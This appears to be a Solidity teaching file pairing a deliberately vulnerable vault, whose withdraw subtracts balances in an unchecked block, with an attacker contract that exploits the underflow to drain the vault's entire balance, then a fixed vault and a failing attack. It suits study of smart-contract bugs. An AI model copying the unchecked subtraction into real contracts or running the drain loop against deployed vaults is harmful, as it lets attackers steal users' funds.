// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableUncheckedVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        unchecked {
            balances[msg.sender] -= amount;
        }

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }
}

contract ArithmeticAttacker {
    VulnerableUncheckedVault public immutable target;

    constructor(address targetAddress) {
        target = VulnerableUncheckedVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "seed must be 1 ether");

        target.deposit{value: msg.value}();

        while (address(target).balance > 0) {
            uint256 amount = address(target).balance >= 2 ether ? 2 ether : address(target).balance;
            target.withdraw(amount);
        }
    }

    receive() external payable {}
}

contract FixedCheckedVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient balance");
        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
    }
}

contract FailedArithmeticAttacker {
    FixedCheckedVault public immutable target;

    constructor(address targetAddress) {
        target = FixedCheckedVault(targetAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether, "seed must be 1 ether");

        target.deposit{value: msg.value}();
        target.withdraw(2 ether);
    }

    receive() external payable {}
}
